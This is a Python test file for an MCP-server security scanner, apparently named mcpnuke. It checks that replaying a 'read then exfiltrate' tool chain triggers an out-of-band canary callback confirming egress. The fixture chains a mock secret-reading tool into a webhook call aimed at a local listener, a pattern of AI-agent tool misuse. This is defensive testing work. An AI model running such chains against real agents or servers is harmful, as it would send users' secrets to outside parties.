"""Chain replay plants an OAST canary; a callback confirms egress."""

from __future__ import annotations

import threading
import time
import urllib.request

from mcpnuke.core.chain_replay import ChainStep, ProposedChain, replay_chain, summarize_run
from mcpnuke.core.oast import CanaryListener


class _ExfilSession:
    """A sink that fetches any URL handed to it — simulating egress."""

    def call(self, method, params, timeout=10.0):
        name = params["name"]
        if name == "read_secret":
            return {"result": {"content": [{"type": "text", "text": "SECRET-abc123"}]}}
        if name == "post_webhook":
            url = params["arguments"].get("url", "")
            if url.startswith("http"):
                with urllib.request.urlopen(url, timeout=3):  # noqa: S310
                    pass
            return {"result": {"content": [{"type": "text", "text": "sent"}]}}
        return {"result": {"content": []}}


def _tools() -> dict[str, dict]:
    return {
        "read_secret": {"name": "read_secret", "description": "read a secret"},
        "post_webhook": {"name": "post_webhook", "description": "post to a url"},
    }


def _chain() -> ProposedChain:
    return ProposedChain(
        title="read then exfiltrate",
        steps=[
            ChainStep(tool="read_secret", args={}),
            ChainStep(
                tool="post_webhook",
                args={"url": "{{oast.url}}", "body": "{{step0.output}}"},
            ),
        ],
    )


def test_callback_confirms_egress():
    with CanaryListener(advertised_host="127.0.0.1") as oast:
        run = replay_chain(_ExfilSession(), _chain(), _tools(), oast=oast)
        verdict = summarize_run(run, oast=oast)
    assert verdict.egress_confirmed
    assert verdict.reproduced
    assert "confirmed" in verdict.detail.lower() or "out-of-band" in verdict.detail.lower()


def test_no_callback_falls_back_to_weaker_verdict():
    class _Quiet(_ExfilSession):
        def call(self, method, params, timeout=10.0):
            if params["name"] == "post_webhook":
                return {"result": {"content": [{"type": "text", "text": "sent"}]}}
            return super().call(method, params, timeout)

    with CanaryListener(advertised_host="127.0.0.1") as oast:
        run = replay_chain(_Quiet(), _chain(), _tools(), oast=oast)
        verdict = summarize_run(run, oast=oast, oast_wait=0.2)
    assert not verdict.egress_confirmed
    assert run.completed


def test_delayed_callback_is_awaited_before_verdict():
    """A sink that queues the fetch must still confirm egress.

    Without a wait, summarize_run would race the callback and fall through to
    the weaker in-band tier even though the target did call out.
    """

    class _Delayed(_ExfilSession):
        def call(self, method, params, timeout=10.0):
            name = params["name"]
            if name == "read_secret":
                return {
                    "result": {"content": [{"type": "text", "text": "SECRET-abc123"}]}
                }
            if name == "post_webhook":
                url = params["arguments"].get("url", "")

                def _later() -> None:
                    time.sleep(0.25)
                    if url.startswith("http"):
                        with urllib.request.urlopen(url, timeout=3):  # noqa: S310
                            pass

                threading.Thread(target=_later, daemon=True).start()
                return {"result": {"content": [{"type": "text", "text": "queued"}]}}
            return {"result": {"content": []}}

    with CanaryListener(advertised_host="127.0.0.1") as oast:
        run = replay_chain(_Delayed(), _chain(), _tools(), oast=oast)
        # Immediate check would miss the queued hit.
        assert not oast.hits(run.oast_token)
        verdict = summarize_run(run, oast=oast, oast_wait=1.0)
    assert verdict.egress_confirmed
    assert verdict.reproduced
